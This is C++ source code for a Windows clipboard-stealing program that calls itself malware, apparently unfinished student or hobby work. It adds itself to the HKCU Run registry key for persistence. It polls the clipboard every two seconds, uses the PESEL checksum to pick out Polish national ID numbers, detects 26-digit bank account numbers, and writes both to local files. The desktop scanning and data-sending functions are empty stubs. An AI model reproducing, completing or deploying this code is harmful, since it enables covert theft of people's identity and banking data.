//C++ Headers

#include <winsock2.h> //Socket Header
#include <windows.h>  //Win API Header
// #include <ws2tcpip.h>

//C Header
#include <stdio.h> //Input Output Header
#include <fstream>
#include <shlobj.h>

//Debug C++ Header
#include <iostream> //Input Output Debug Header
#include <filesystem>
#include <string>

void checkPesel(char *probablePesel);

void checkAccount(const char *probableAccount);

void scanDesktop(const char *path);

void persistMalware();

void sendData();

int countDigits(const char *cbTextPreprocess);

int main()
{
    //Hiding console windows
    HWND windowHandle;
    AllocConsole();
    windowHandle = FindWindowA("ConsoleWindowClass", NULL); //Find the previous Window handler and hide/show the window depending upon the next command
    ShowWindow(windowHandle, SW_SHOWNORMAL);                //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console

    persistMalware();

    //Scan desktop in search for data
    scanDesktop("");

    //Clipboard monitoring loop
    while (true)
    {
        while (!OpenClipboard(nullptr))
        {
            //Could not open clipboard
            // std::cout << "Could not open clopboard" << std::endl;
        }
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData == nullptr)
        {
            // std::cout << "Couldn't retrive data from clipboard" << std::endl;
        }
        char *clpbrdText = static_cast<char *>(GlobalLock(hData));
        if (clpbrdText == nullptr)
        {
            // std::cout << "Couldn't change data to char" << std::endl;
            GlobalUnlock(hData);
            CloseClipboard();
        }
        else
        {
            GlobalUnlock(hData);
            CloseClipboard();
            int len = countDigits(clpbrdText);
            std::cout << len << std::endl;
            if (len >= 11)
            {
                std::cout << "Possible PESEL" << std::endl;
                checkPesel(clpbrdText);
            }
            if (len >= 26)
            {
                checkAccount(clpbrdText);
                std::cout << "Possible Account number" << std::endl;
            }
        }
        //TODO: Setup proper loop time
        Sleep(2000);
    }

    return 0;
}

int countDigits(const char *cbTextPreprocess)
{
    int out = 0;

    for (int i = 0; cbTextPreprocess[i] != 0; i++)
    {
        if (isdigit(cbTextPreprocess[i]))
        {
            ++out;
        }
    }
    return out;
}

void scanDesktop(const char *pathPassed)
{
    //TODO: Scan desktop
    char path[MAX_PATH]; // must be _MAX_PATH in size

    if (strlen(pathPassed) > 0)
    {
        std::cout << "Checking recursevly" << std::endl;
        strcpy(path, pathPassed);
    }else{
        std::cout << "Starting recursion" << std::endl;
        HRESULT resultDesktop = SHGetFolderPath(NULL, // no parent window
                                            CSIDL_DESKTOP,
                                            0,    // no flags
                                            NULL, // no tokens
                                            path);
    }
    
    
    std::cout << path << std::endl;
    int len = strlen(path);
    path[len] = '\\';
    path[len + 1] = '*';
    path[len + 2] = '\0';
    std::cout << path << std::endl;

    WIN32_FIND_DATA data;
    HANDLE hFind = FindFirstFile(path, &data);
    do
    {
        std::cout << data.cFileName << " ";
        if(data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY){
            std::cout << " Directory" <<std::endl;
            //TODO: Append path and run recursion
        }else{
            std::cout << " File" <<std::endl;
            //TODO: Check file 
        }
        
    } while (FindNextFile(hFind, &data));
    FindClose(hFind);

    // HANDLE resultFiles = FindFirstFile("C:\\semester2\\*", &data);
}

void sendData()
{
    //TODO: Send data
}

void checkPesel(char *probablePesel)
{
    //TODO: Save to file

    char pesel[12];

    int weights[10] = {9, 7, 3, 1, 9, 7, 3, 1, 9, 7};

    int count = 0;

    while (*probablePesel != 0)
    {
        if (isdigit(*probablePesel))
        {
            pesel[count] = *probablePesel;
            ++count;
            if (count == 11)
            {
                pesel[11] = '\0';
                int sum = 0;
                for (int i = 0; i < 10; i++)
                {
                    sum += (pesel[i] - '0') * weights[i];
                }
                if (sum % 10 == pesel[10] - '0')
                {
                    std::cout << "Found pesel" << std::endl;
                    std::cout << pesel << std::endl;
                    std::ifstream myfile;
                    myfile.open("pesel.txt");
                    std::string line;
                    bool notPresent = true;
                    if (myfile.is_open())
                    {
                        while (std::getline(myfile, line))
                        {
                            if (strcmp(line.c_str(), pesel) == 0)
                            {
                                std::cout << "Already present. Not adding" << std::endl;
                                notPresent = false;
                                break;
                            }
                        }
                        myfile.close();
                    }
                    if (notPresent)
                    {
                        std::ofstream myfile;
                        myfile.open("pesel.txt", std::ios::app);
                        myfile << '\n';
                        myfile << pesel;
                        myfile.close();
                    }
                }
                count = 0;
            }
        }
        else
        {
            count = 0;
        }
        probablePesel++;
    }
}

void checkAccount(const char *probableAccount)
{
    //TODO: Save to file

    char account[27];

    int count = 0;

    while (*probableAccount != 0)
    {
        if (isdigit(*probableAccount))
        {
            account[count] = *probableAccount;
            count++;
            if (count == 26)
            {
                account[26] = '\0';
                std::cout << "Found probable account" << std::endl;
                std::cout << account << std::endl;
                std::ifstream myfile;
                myfile.open("account.txt");
                std::string line;
                bool notPresent = true;
                if (myfile.is_open())
                {
                    while (std::getline(myfile, line))
                    {
                        if (strcmp(line.c_str(), account) == 0)
                        {
                            std::cout << "Already present. Not adding" << std::endl;
                            notPresent = false;
                            break;
                        }
                    }
                    myfile.close();
                }
                if (notPresent)
                {
                    std::ofstream myfile;
                    myfile.open("account.txt", std::ios::app);
                    myfile << '\n';
                    myfile << account;
                    myfile.close();
                }

                myfile.close();
            }
        }
        else
        {
            if (count == 2 || count == 6 || count == 10 || count == 14 || count == 18 || count == 22)
            {
                /* code */
            }
            else
            {
                count = 0;
            }
        }

        probableAccount++;
    }
}

void persistMalware()
{

    HKEY key;
    TCHAR NPath[MAX_PATH];
    GetModuleFileName(NULL, NPath, MAX_PATH);

    std::cout << NPath << std::endl;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS)
    {
        std::cout << "Opened registry" << std::endl;
        if (RegSetValueExA(key, "Mal", 0, REG_SZ, (LPBYTE)NPath, sizeof(NPath)) == ERROR_SUCCESS)
        {
            std::cout << "Key changed in registry" << std::endl;
        }
        else
        {
            std::cout << "Key not changed in registry" << std::endl;
            // printf("Error %u ", (unsigned int)GetLastError());
        }

        RegCloseKey(key);
    }
}